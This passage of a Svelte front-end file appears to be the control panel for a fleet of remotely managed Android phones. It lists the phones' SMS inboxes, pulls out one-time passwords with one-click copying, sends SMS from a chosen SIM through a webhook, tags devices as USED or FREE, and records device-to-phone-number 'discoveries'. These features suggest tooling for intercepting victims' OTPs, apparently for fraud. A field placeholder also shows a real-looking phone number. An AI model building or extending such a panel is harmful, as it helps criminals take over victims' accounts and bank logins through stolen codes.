                      style="background:{c.online > 0 ? '#22c55e' : '#334155'}"
                    ></span>
                    {c.name}
                    <span class="cb-n"
                      >{c.loading ? "…" : c.error ? "!" : c.keyCount}</span
                    >
                  </button>
                {/each}
              </div>
            </div>
          </div>

          <!-- Result count + Top pagination bar -->
          <div class="dt-count-row">
            <div class="dt-count">
              <span class="dt-cnt-val">{filteredTableDevices.length}</span>
              device{filteredTableDevices.length === 1 ? "" : "s"}
              {#if tableActiveFilters.size > 0 || tableConnFilter || tableSearch}
                · <span class="dt-filter-tag">
                  {[...tableActiveFilters].join(" + ")}
                  {tableConnFilter
                    ? " @" +
                      connections.find((c) => c.id === tableConnFilter)?.name
                    : ""}
                  {tableSearch ? ` 🔍 "${tableSearch}"` : ""}
                </span>
              {/if}
            </div>
            <div
              class="pag-compact"
              aria-label="Device pagination top controls"
            >
              <button
                class="pag-btn-sm"
                disabled={devicePage === 0}
                onclick={() => setDevicePage(devicePage - 1)}
                aria-label="Previous page"
                title="Previous page">‹ Prev</button
              >
              <span class="pag-pill" title="Current page of total pages"
                >Page <strong>{devicePage + 1}</strong> of
                <strong>{totalDevicePages}</strong></span
              >
              <button
                class="pag-btn-sm"
                disabled={devicePage >= totalDevicePages - 1}
                onclick={() => setDevicePage(devicePage + 1)}
                aria-label="Next page"
                title="Next page">Next ›</button
              >
            </div>
          </div>

          <!-- Device list — paginated, 20/page with vertical scroll -->
          <div class="dt-scroll" bind:this={dtScrollEl}>
            <div class="dev-card-grid">
              {#each filteredTableDevices.slice(devicePage * DEVICES_PER_PAGE, (devicePage + 1) * DEVICES_PER_PAGE) as d (d.connId + "::" + d.key)}
                {@const on = d.info ? isOnline(d.info) : null}
                {@const bat = d.info ? getBattery(d.info) : null}
                {@const fp = getDisplayPhone(d.connId, d.key, d.info)}
                {@const sc = d.info ? getSims(d.info) : null}
                {@const isNew = newDeviceKeys.has(`${d.connId}::${d.key}`)}
                {@const devUsed = isUsed(`dev::${d.connId}::${d.key}`)}
                {@const lastMsgTs = Number(d.info?.lastMessageTime ?? 0)}
                {@const lastMsgFmt = lastMsgTs ? (() => {
                  const diff = Date.now() - lastMsgTs;
                  if (diff < 60000) return `${Math.floor(diff/1000)}s ago`;
                  if (diff < 3600000) return `${Math.floor(diff/60000)}m ago`;
                  if (diff < 86400000) return `${Math.floor(diff/3600000)}h ago`;
                  const d2 = new Date(lastMsgTs);
                  return `${d2.getDate()}/${d2.getMonth()+1} ${String(d2.getHours()).padStart(2,'0')}:${String(d2.getMinutes()).padStart(2,'0')}`;
                })() : null}
                <div
                  class="dev-card {selectedKey === d.key &&
                  selectedConnId === d.connId
                    ? 'dev-card-sel'
                    : ''} {devUsed ? 'dev-card-used' : ''}"
                  onclick={() => selectDevice(d.connId, d.key)}
                  role="button"
                  tabindex="0"
                  onkeydown={(e) =>
                    e.key === "Enter" && selectDevice(d.connId, d.key)}
                  aria-label="Select device {d.key}"
                >
                  <!-- Left accent bar (Firebase color) -->
                  <span class="dev-card-bar" style="background:{d.conn.color}"
                  ></span>
                  <!-- Status dot -->
                  <span
                    class="td-dot {on === true
                      ? 'ton'
                      : on === false
                        ? 'toff'
                        : 'tunk'} dev-card-dot"
                  ></span>
                  <!-- Main content -->
                  <div class="dev-card-body">
                    <!-- Device ID row -->
                    <div class="dev-card-id-row">
                      <span class="mono dev-card-id"
                        >{d.key.slice(0, 16)}{d.key.length > 16
                          ? "…"
                          : ""}</span
                      >
                      {#if isNew}<span class="td-new">NEW</span>{/if}
                      <!-- Used/Not-used badge -->
                      <span class="dev-card-used-badge {devUsed ? 'dcub-used' : 'dcub-fresh'}" title="{devUsed ? 'Marked as used' : 'Not yet used'}">{devUsed ? 'USED' : 'FREE'}</span>
                      <button
                        class="icon-btn-xs"
                        title="Copy device ID"
                        aria-label="Copy device ID"
                        onclick={(e) => {
                          e.stopPropagation();
                          copyText(d.key);
                          toast("Device ID copied", "success");
                        }}
                      >
                        <svg
                          width="11"
                          height="11"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          ><rect
                            x="9"
                            y="9"
                            width="13"
                            height="13"
                            rx="2"
                          /><path
                            d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                          /></svg
                        >
                      </button>
                    </div>
                    <!-- Phone + SIM + last SMS row -->
                    <div class="dev-card-sub">
                      {#if fp}
                        <button
                          class="dev-card-phone-btn"
                          title="Copy number ({extractNumber(fp)})"
                          aria-label="Copy phone number"
                          onclick={(e) => {
                            e.stopPropagation();
                            copyPhone(fp);
                          }}
                        >{fp}</button>
                      {:else}
                        <span class="dev-card-no-num">{d.conn.name}</span>
                      {/if}
                      {#if sc}<span class="dev-card-sim">{sc}S</span>{/if}
                      {#if lastMsgFmt}
                        <span class="dev-card-last-sms" title="Last SMS received: {new Date(lastMsgTs).toLocaleString()}">📨 {lastMsgFmt}</span>
                      {/if}
                    </div>
                  </div>
                  <!-- Right: battery + arrow -->
                  <div class="dev-card-right">
                    {#if bat !== null}
                      <span
                        class="dev-card-bat"
                        style="background:{batColor(bat)}15;color:{batColor(
                          bat,
                        )};border:1px solid {batColor(bat)}44">{bat}%</span
                      >
                    {/if}
                    <svg
                      class="dev-card-arrow"
                      width="14"
                      height="14"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2.5"><path d="M9 18l6-6-6-6" /></svg
                    >
                  </div>
                </div>
              {/each}
              {#if filteredTableDevices.length === 0}
                <div class="dt-empty">
                  No devices match the selected filters
                </div>
              {/if}
            </div>
          </div>
          <!-- Bottom pagination bar — always visible -->
          <div class="pag-bar">
            <div class="pag-group-left">
              <span class="pag-summary">
                Showing <strong
                  >{filteredTableDevices.length === 0
                    ? 0
                    : devicePage * DEVICES_PER_PAGE + 1}–{Math.min(
                    (devicePage + 1) * DEVICES_PER_PAGE,
                    filteredTableDevices.length,
                  )}</strong
                >
                of <strong>{filteredTableDevices.length}</strong>
              </span>
            </div>
            <div class="pag-group-controls">
              <button
                class="pag-btn pag-btn-nav"
                disabled={devicePage === 0}
                onclick={() => setDevicePage(0)}
                aria-label="First page"
                title="First page"
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  ><polyline points="11 17 6 12 11 7" /><polyline
                    points="18 17 13 12 18 7"
                  /></svg
                >
                <span class="pag-btn-txt">First</span>
              </button>
              <button
                class="pag-btn pag-btn-nav"
                disabled={devicePage === 0}
                onclick={() => setDevicePage(devicePage - 1)}
                aria-label="Previous page"
                title="Previous page"
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"><polyline points="15 18 9 12 15 6" /></svg
                >
                <span class="pag-btn-txt">Prev</span>
              </button>
              <div class="pag-nums">
                {#if totalDevicePages <= 7}
                  {#each Array(totalDevicePages) as _, idx}
                    <button
                      class="pag-btn pag-num {devicePage === idx
                        ? 'active'
                        : ''}"
                      onclick={() => setDevicePage(idx)}
                      aria-label="Page {idx + 1}"
                      aria-current={devicePage === idx ? "page" : undefined}
                    >
                      {idx + 1}
                    </button>
                  {/each}
                {:else}
                  <span class="pag-info-badge">
                    Page <strong>{devicePage + 1}</strong> /
                    <strong>{totalDevicePages}</strong>
                  </span>
                {/if}
              </div>
              <button
                class="pag-btn pag-btn-nav"
                disabled={devicePage >= totalDevicePages - 1}
                onclick={() => setDevicePage(devicePage + 1)}
                aria-label="Next page"
                title="Next page"
              >
                <span class="pag-btn-txt">Next</span>
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"><polyline points="9 18 15 12 9 6" /></svg
                >
              </button>
              <button
                class="pag-btn pag-btn-nav"
                disabled={devicePage >= totalDevicePages - 1}
                onclick={() => setDevicePage(totalDevicePages - 1)}
                aria-label="Last page"
                title="Last page"
              >
                <span class="pag-btn-txt">Last</span>
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  ><polyline points="13 17 18 12 13 7" /><polyline
                    points="6 17 11 12 6 7"
                  /></svg
                >
              </button>
            </div>
          </div>
        </div>

        <!-- ── DEVICE ────────────────────────────────────────────────────── -->
      {:else if activeTab === "device"}
        {#if !selectedKey}
          <div class="no-sel">Select a device from the sidebar</div>
        {:else}
          {@const on = selectedInfo ? isOnline(selectedInfo) : null}
          {@const bat = selectedInfo ? getBattery(selectedInfo) : null}

          <!-- Device header -->
          <div class="dv-card">
            <div class="dv-left">
              <div class="dv-ico">
                <svg
                  width="26"
                  height="26"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.5"
                  opacity="0.7"
                >
                  <rect x="5" y="2" width="14" height="20" rx="2" /><path
                    d="M12 18h.01"
                  />
                </svg>
              </div>
              <div>
                <div class="dv-id mono">{selectedKey}</div>
                <div
                  style="display:flex;gap:8px;align-items:center;margin-top:6px;flex-wrap:wrap"
                >
                  {#if on !== null}
                    <span class="ob {on ? 'ob-on' : 'ob-off'}"
                      >{on ? "Online" : "Offline"}</span
                    >
                  {:else}
                    <span class="ob ob-unk">No device info</span>
                  {/if}
                  {#if selectedConn}
                    <span style="font-size:12px;color:{selectedConn.color}"
                      >· {selectedConn.name}</span
                    >
                  {/if}
                </div>
              </div>
            </div>
            {#if bat !== null}
              <div class="dv-bat">
                <div class="dv-bat-n" style="color:{batColor(bat)}">{bat}%</div>
                <div class="dv-bat-l">BATTERY</div>
                <div class="bat-track">
                  <div
                    class="bat-fill"
                    style="width:{bat}%;background:{batColor(bat)}"
                  ></div>
                </div>
              </div>
            {/if}
          </div>

          <!-- Info grid -->
          {@const dispPhone = getDisplayPhone(
            selectedConnId,
            selectedKey,
            selectedInfo,
          )}
          {#if selectedInfo || dispPhone}
            <div class="info-grid">
              <div class="ib">
                <div class="ib-l">PHONE</div>
                {#if editingPhone && editingPhone.connId === selectedConnId && editingPhone.key === selectedKey}
                  <div class="phone-edit-row">
                    <input
                      class="phone-edit-in"
                      bind:value={editPhoneVal}
                      placeholder="e.g. Jio +919764912687"
                      onkeydown={(e) => e.key === "Enter" && commitPhone()}
                      aria-label="Phone number"
                    />
                    <button class="btn btn-primary btn-sm" onclick={commitPhone}
                      >Save</button
                    >
                    <button
                      class="btn btn-ghost btn-sm"
                      onclick={() => (editingPhone = null)}>✕</button
                    >
                  </div>
                {:else}
                  <div
                    class="ib-v"
                    style="display:flex;align-items:center;gap:6px;flex-wrap:wrap"
                  >
                    {#if dispPhone}
                      <button
                        class="dev-card-phone-btn"
                        style="font-size:13px"
                        onclick={() => copyPhone(dispPhone)}
                        title="Click to copy number"
                      >{dispPhone}</button>
                      <button
                        class="af-cp"
                        onclick={() => {
                          copyPhone(dispPhone);
                        }}
                        title="Copy 10-digit number"
                        aria-label="Copy number"
                      >
                        <svg
                          width="10"
                          height="10"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          ><rect
                            x="9"
                            y="9"
                            width="13"
                            height="13"
                            rx="2"
                          /><path
                            d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                          /></svg
                        >
                      </button>
                    {:else}
                      <span>—</span>
                    {/if}
                    <button
                      class="edit-ph-btn"
                      onclick={() =>
                        startEditPhone(selectedConnId, selectedKey)}
                      title="Edit local number"
                      aria-label="Edit phone"
                    >
                      {dispPhone ? "✏️" : "+ Add number"}
                    </button>
                  </div>
                {/if}
              </div>
              <div class="ib">
                <div class="ib-l">IP</div>
                <div class="ib-v mono">
                  {selectedInfo ? (getIp(selectedInfo) ?? "—") : "—"}
                </div>
              </div>
              <div class="ib">
                <div class="ib-l">ANDROID</div>
                <div class="ib-v">
                  {selectedInfo ? (getAndroid(selectedInfo) ?? "—") : "—"}
                </div>
              </div>
              <div class="ib">
                <div class="ib-l">SIMS</div>
                <div class="ib-v">
                  {selectedInfo ? (getSims(selectedInfo) ?? 0) : 0}
                </div>
              </div>
            </div>
          {:else}
            <div class="info-grid">
              <div class="ib">
                <div class="ib-l">PHONE</div>
                {#if editingPhone && editingPhone.connId === selectedConnId && editingPhone.key === selectedKey}
                  <div class="phone-edit-row">
                    <input
                      class="phone-edit-in"
                      bind:value={editPhoneVal}
                      placeholder="e.g. Jio +919764912687"
                      onkeydown={(e) => e.key === "Enter" && commitPhone()}
                      aria-label="Phone number"
                    />
                    <button class="btn btn-primary btn-sm" onclick={commitPhone}
                      >Save</button
                    >
                    <button
                      class="btn btn-ghost btn-sm"
                      onclick={() => (editingPhone = null)}>✕</button
                    >
                  </div>
                {:else}
                  <div class="ib-v">
                    <button
                      class="edit-ph-btn add-ph"
                      onclick={() =>
                        startEditPhone(selectedConnId, selectedKey)}
                      >+ Add local number</button
                    >
                  </div>
                {/if}
              </div>
              <div class="ib">
                <div class="ib-l">IP</div>
                <div class="ib-v" style="color:#334155">—</div>
              </div>
              <div class="ib">
                <div class="ib-l">ANDROID</div>
                <div class="ib-v" style="color:#334155">—</div>
              </div>
              <div class="ib">
                <div class="ib-l">SIMS</div>
                <div class="ib-v" style="color:#334155">—</div>
              </div>
            </div>
          {/if}

          <!-- Action buttons + device used toggle -->
          {@const devUsedDetail = isUsed(
            `dev::${selectedConnId}::${selectedKey}`,
          )}
          <div class="act-row">
            <button
              class="act-btn ab-msg"
              onclick={() => switchTab("messages")}
            >
              💬 Messages
            </button>
            <button class="act-btn ab-snd" onclick={() => switchTab("send")}>
              🚀 Send
            </button>
          </div>

          <!-- Device used checkbox -->
          <div class="dev-used-row">
            <label class="dev-used-label" for="dev-used-chk">
              <input
                id="dev-used-chk"
                type="checkbox"
                class="dev-check"
                checked={devUsedDetail}
                onchange={() =>
                  toggleUsed(`dev::${selectedConnId}::${selectedKey}`)}
                aria-label="Mark device used"
              />
              <span>{devUsedDetail ? "✓ Marked as Used" : "Mark as Used"}</span>
            </label>
          </div>
        {/if}

        <!-- ── MESSAGES ───────────────────────────────────────────────────── -->
      {:else if activeTab === "messages"}
        {#if !selectedKey}
          <div class="no-sel">Select a device first</div>
        {:else if msgsLoading}
          <div class="no-sel">
            <div class="spin-ring"></div>
            <p>Loading messages…</p>
          </div>
        {:else if msgs === null}
          <div class="no-sel">
            <p>
              Click to load messages for <code class="mono">{selectedKey}</code>
            </p>
            <button class="btn btn-primary" onclick={loadMessages}
              >Load Messages</button
            >
          </div>
        {:else}
          <div class="msg-topbar">
            <span class="msg-count">{filteredMsgs.length} / 50 messages</span>
            <div class="msg-search-wrap">
              <svg
                width="12"
                height="12"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"
                opacity="0.4"
                ><circle cx="11" cy="11" r="8" /><path
                  d="m21 21-4.35-4.35"
                /></svg
              >
              <input
                class="msg-search"
                bind:value={msgsSearch}
                placeholder="Search messages…"
                aria-label="Search messages"
              />
            </div>
            <div class="msg-tabs">
              <button
                class="mtab {msgsFilter === 'all' ? 'mta' : ''}"
                onclick={() => (msgsFilter = "all")}>All</button
              >
              <button
                class="mtab {msgsFilter === 'in' ? 'mti' : ''}"
                onclick={() => (msgsFilter = "in")}>In</button
              >
              <button
                class="mtab {msgsFilter === 'out' ? 'mto' : ''}"
                onclick={() => (msgsFilter = "out")}>Out</button
              >
            </div>
            <button class="btn btn-ghost btn-sm" onclick={loadMessages}
              >↻</button
            >
          </div>

          {#if filteredMsgs.length === 0}
            <div class="no-sel" style="min-height:200px">
              <p style="color:#475569">
                No messages found{msgsSearch || msgsFilter !== "all"
                  ? " for this filter"
                  : ""}
              </p>
            </div>
          {:else}
            <div class="msg-list">
              {#each filteredMsgs as [id, msg]}
                {@const msgText = msg.message ?? msg.body ?? msg.text ?? ""}
                {@const otp = extractOTP(msgText)}
                <div class="msg-card">
                  <div class="mc-row">
                    {#if extractNumber(msg.sender ?? msg.from)}
                      <button
                        class="mc-sender-btn"
                        onclick={() => copyPhone(msg.sender ?? msg.from)}
                        title="Click to copy number ({extractNumber(msg.sender ?? msg.from)})"
                      >{msg.sender ?? msg.from}</button>
                    {:else}
                      <span class="mc-sender">{msg.sender ?? msg.from ?? "Unknown"}</span>
                    {/if}
                    <span
                      class="mc-badge {(msg.type || 'incoming') === 'incoming'
                        ? 'badge-in'
                        : 'badge-out'}"
                    >
                      {(msg.type || "incoming") === "incoming"
                        ? "Incoming"
                        : "Outgoing"}
                    </span>
                  </div>
                  <div class="mc-body">
                    {msgText.slice(0, 80)}{msgText.length > 80 ? "…" : ""}
                  </div>
                  {#if otp}
                    <div
                      class="mc-otp"
                      role="button"
                      tabindex="0"
                      onclick={() => {
                        copyText(otp);
                        toast(`OTP ${otp} copied!`, "success");
                      }}
                      onkeydown={(e) =>
                        e.key === "Enter" &&
                        (copyText(otp), toast(`OTP ${otp} copied!`, "success"))}
                      title="Click to copy OTP"
                    >
                      <span class="otp-label">OTP</span>
                      <code class="otp-code">{otp}</code>
                      <span class="otp-copy-hint">
                        <svg
                          width="11"
                          height="11"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          ><rect
                            x="9"
                            y="9"
                            width="13"
                            height="13"
                            rx="2"
                          /><path
                            d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                          /></svg
                        >
                      </span>
                    </div>
                  {/if}
                  <div class="mc-foot">
                    {#if msg.dateTime}<span class="mc-dt"
                        >{toIST(msg.dateTime)}</span
                      >{/if}
                    <button
                      class="af-cp"
                      onclick={() => copyText(msgText)}
                      title="Copy full message"
                      aria-label="Copy message"
                    >
                      <svg
                        width="10"
                        height="10"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        ><rect x="9" y="9" width="13" height="13" rx="2" /><path
                          d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                        /></svg
                      >
                    </button>
                  </div>
                </div>
              {/each}
            </div>
          {/if}
        {/if}

        <!-- ── SEND SMS ───────────────────────────────────────────────────── -->
      {:else if activeTab === "send"}
        {#if !selectedKey}
          <div class="no-sel">Select a device first</div>
        {:else}
          <div class="send-wrap">
            <div class="send-hdr">Send SMS</div>
            <div class="send-sub">
              via <span style="color:{selectedConn?.color}"
                >{selectedConn?.name}</span
              >
              → <code class="mono">{selectedKey}</code>
            </div>
            <div
              class="send-sub"
              style="margin-top:2px;font-size:10.5px;color:#475569;word-break:break-all;"
            >
              📍 <code style="font-size:10px;color:#64748b"
                >{selectedConn?.url}/clients/{selectedKey}/webhookEvent/sendSms</code
              >
            </div>
            <div class="send-form">
              <div class="field">
                <label for="sms-to">To (phone number)</label>
                <input
                  id="sms-to"
                  bind:value={smsDraft.to}
                  placeholder="+91 XXXXX XXXXX"
                />
              </div>
              <div class="field">
                <label for="sms-sim">SIM Slot</label>
                <select
                  id="sms-sim"
                  bind:value={smsDraft.sim}
                  class="tiny-sel"
                  style="font-size:13px;padding:8px 10px;"
                >
                  <option value="0">SIM 1 (Slot 0)</option>
                  <option value="1">SIM 2 (Slot 1)</option>
                </select>
              </div>
              <div class="field">
                <label for="sms-msg">Message</label>
                <textarea
                  id="sms-msg"
                  rows="5"
                  bind:value={smsDraft.body}
                  placeholder="Type your message…"
                ></textarea>
              </div>
              <button
                class="act-btn ab-snd"
                onclick={doSendSMS}
                disabled={smsSending ||
                  !smsDraft.to.trim() ||
                  !smsDraft.body.trim()}
              >
                {#if smsSending}<span
                    class="spin-ring"
                    style="width:14px;height:14px;border-width:2px"
                  ></span>
                {:else}🚀 Send SMS{/if}
              </button>
            </div>
          </div>
        {/if}
      {/if}

      <!-- ── DISCOVERED NUMBERS ─────────────────────────────────────── -->
      {:else if activeTab === 'discovered'}
        <div class="disc-wrap">
          <div class="disc-hdr">
            <div class="disc-hdr-top">
              <h3 class="disc-title">📱 Discovered Numbers</h3>
              <span class="disc-count">{filteredDiscovery.length} of {discoveryRecords.length}</span>
            </div>
            <div class="disc-controls">
              <input type="search" class="disc-search" placeholder="Search device ID, phone, connection…"
                bind:value={discoverySearch} />
              <select class="disc-sort" bind:value={discoverySort}>
                <option value="date-desc">Newest first</option>
                <option value="date-asc">Oldest first</option>
                <option value="conn">By connection</option>
              </select>
              <button class="disc-refresh" onclick={loadDiscoveryRecords} title="Refresh">↻</button>
            </div>
          </div>

          {#if filteredDiscovery.length === 0}
            <div class="disc-empty">
              {#if discoveryRecords.length === 0}
                No discovered numbers yet. Go to <a href="/discovery">Discovery</a> to start.
              {:else}
                No results match "{discoverySearch}"
              {/if}
            </div>
          {:else}
            <div class="disc-list">
              {#each filteredDiscovery as rec (rec.deviceId + rec.discoveredAt)}
                <div class="disc-row">
                  <div class="disc-row-top">
                    <button class="disc-devid" onclick={() => {
                      try { navigator.clipboard.writeText(rec.deviceId); } catch {}
                      addToast(rec.deviceId.slice(0, 12) + '… copied', 'success');
                    }}>{rec.deviceId}</button>
                    <span class="disc-arrow">→</span>
                    <button class="disc-phone" onclick={() => {
                      try { navigator.clipboard.writeText(rec.phoneNumber); } catch {}
                      addToast(rec.phoneNumber + ' copied', 'success');
                    }}>{rec.phoneNumber}</button>
                  </div>
                  <div class="disc-row-meta">
                    {#if rec.connectionName}
                      <span class="disc-conn">{rec.connectionName}</span>
                    {/if}
                    <span class="disc-method {rec.discoveryMethod === 'manual' ? 'disc-method-manual' : 'disc-method-sms'}">
                      {rec.discoveryMethod === 'manual' ? '✏️ manual' : '📡 sms'}
                    </span>
                    {#if rec.attemptCount > 0}
                      <span class="disc-attempts">{rec.attemptCount}×</span>
                    {/if}
                    <span class="disc-date">
                      {new Date(rec.discoveredAt).toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', timeZone: 'Asia/Kolkata' })}
                      {new Date(rec.discoveredAt).toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true, timeZone: 'Asia/Kolkata' })}
                    </span>
                  </div>
                </div>
              {/each}
            </div>
          {/if}
        </div>
    </div>
  </div>
</div>

<!-- Toasts -->
<div class="toast-stack">
  {#each toasts as t (t.id)}
    <div class="toast {t.type} {t.out ? 'out' : ''}">{t.msg}</div>
  {/each}
</div>

<!-- Mobile Bottom Navigation Bar -->
<nav class="bottom-nav" aria-label="Main navigation">
  <button
    class="bn-item {activeBottomTab === 'dashboard' ? 'bn-active' : ''}"
    onclick={() => setBottomTab("dashboard")}
    aria-label="Dashboard"
    aria-current={activeBottomTab === "dashboard" ? "page" : undefined}
  >
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      stroke-width="2"
    >
      <rect x="3" y="3" width="7" height="7" rx="1" /><rect
        x="14"
        y="3"
        width="7"
        height="7"
        rx="1"
      />
      <rect x="14" y="14" width="7" height="7" rx="1" /><rect
        x="3"
        y="14"
        width="7"
        height="7"
        rx="1"
      />
    </svg>
    <span class="bn-label">Dashboard</span>
  </button>
  <button
    class="bn-item {activeBottomTab === 'devices' ? 'bn-active' : ''}"
    onclick={() => setBottomTab("devices")}
    aria-label="Devices"
    aria-current={activeBottomTab === "devices" ? "page" : undefined}
  >
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      stroke-width="2"
    >
      <rect x="5" y="2" width="14" height="20" rx="2" /><line
        x1="12"
        y1="18"
        x2="12.01"
        y2="18"
      />
    </svg>
    <span class="bn-label">Devices</span>
  </button>
  {#if showNotifsTab}
    <!-- Notifications bell with badge -->
    <button
      class="bn-item {showBellPanel ? 'bn-active' : ''} bn-notif-wrap"
      onclick={() => setBottomTab("notifs")}
      aria-label="Notifications"
    >
      <div style="position:relative;display:inline-flex">
        {#if notifsEnabled}
          <svg
            width="20"
            height="20"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
              d="M13.73 21a2 2 0 0 1-3.46 0"
            /></svg
          >
        {:else}
          <svg
            width="20"
            height="20"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
              d="M13.73 21a2 2 0 0 1-3.46 0"
            /><line x1="2" y1="2" x2="22" y2="22" /></svg
          >
        {/if}
        {#if notifications.length > 0}
          <span class="bn-notif-badge"
            >{notifications.length > 9 ? "9+" : notifications.length}</span
          >
        {/if}
      </div>
      <span class="bn-label">{notifsEnabled ? "Alerts" : "Muted"}</span>
    </button>
  {/if}
  <button
    class="bn-item {activeBottomTab === 'send' ? 'bn-active' : ''}"
    onclick={() => setBottomTab("send")}
    aria-label="Send SMS"
    aria-current={activeBottomTab === "send" ? "page" : undefined}
  >
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      stroke-width="2"
    >
      <line x1="22" y1="2" x2="11" y2="13" /><polygon
        points="22 2 15 22 11 13 2 9 22 2"
      />
    </svg>
    <span class="bn-label">Send</span>
  </button>
  <button
    class="bn-item {activeBottomTab === 'settings' ? 'bn-active' : ''}"
    onclick={() => setBottomTab("settings")}
    aria-label="Settings"
    aria-current={activeBottomTab === "settings" ? "page" : undefined}
  >
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      stroke-width="2"
    >
      <circle cx="12" cy="12" r="3" />
      <path
        d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"
      />
    </svg>
    <span class="bn-label">Settings</span>
  </button>
</nav>

<style>
  * {
    box-sizing: border-box;
  }
  :global(html, body) {
    margin: 0;
    padding: 0;
    height: 100%;
    overflow: hidden;
  }
  .shell {
    display: flex;
    height: 100vh;
    height: 100dvh;
    overflow: hidden;
    background: #0b0e17;
    color: #e2e8f0;
    font-family: "Inter", system-ui, sans-serif;
  }

  /* ── SIDEBAR ─────────────────────────────────────────────────────────── */
  .sidebar {
    width: 220px;
    flex-shrink: 0;
    background: #0e1420;
    border-right: 1px solid rgba(255, 255, 255, 0.07);
    display: flex;
    flex-direction: column;
    height: 100vh;
    overflow: hidden;
  }

  .side-brand {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 14px 14px 10px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    flex-shrink: 0;
  }
  .brand-txt {
    font-size: 16px;
    font-weight: 800;
    color: #f97316;
    letter-spacing: 0.01em;
  }

  .side-search {
    display: flex;
    align-items: center;
    gap: 6px;
    margin: 8px 10px 4px;
    padding: 7px 10px;
    background: rgba(255, 255, 255, 0.04);
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-radius: 6px;
    flex-shrink: 0;
  }
  .search-in {
    background: none;
    border: none;
    outline: none;
    font-size: 12px;
    color: #e2e8f0;
    width: 100%;
    font-family: inherit;
  }
  .search-in::placeholder {
    color: #475569;
  }

  .side-filter {
    display: flex;
    gap: 3px;
    padding: 0 10px 5px;
    flex-shrink: 0;
    flex-wrap: wrap;
  }
  .filt {
    flex: 1;
    min-width: 0;
    padding: 4px 3px;
    border-radius: 5px;
    border: 1px solid rgba(255, 255, 255, 0.08);
    background: transparent;
    color: #64748b;
    font-size: 11px;
    font-weight: 600;
    cursor: pointer;
    font-family: inherit;
    transition: all 120ms;
    white-space: nowrap;
  }
  .filt:hover {
    color: #94a3b8;
  }
  .fa {
    background: #f97316 !important;
    color: #fff !important;
    border-color: #f97316 !important;
  }
  .fo {
    background: rgba(34, 197, 94, 0.18) !important;
    color: #22c55e !important;
    border-color: rgba(34, 197, 94, 0.4) !important;
  }
  .fx {
    background: rgba(239, 68, 68, 0.14) !important;
    color: #ef4444 !important;
    border-color: rgba(239, 68, 68, 0.3) !important;
  }
  .fn {
    background: rgba(56, 189, 248, 0.15) !important;
    color: #38bdf8 !important;
    border-color: rgba(56, 189, 248, 0.35) !important;
  }
  .fu {
    background: rgba(167, 139, 250, 0.15) !important;
    color: #a78bfa !important;
    border-color: rgba(167, 139, 250, 0.35) !important;
  }

  .dev-list {
    flex: 1;
    overflow-y: auto;
  }
  .dev-list::-webkit-scrollbar {
    width: 3px;
  }
  .dev-list::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.09);
    border-radius: 99px;
  }

  .dev-item {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 8px 10px 8px 12px;
    cursor: pointer;
    border-left: 3px solid transparent;
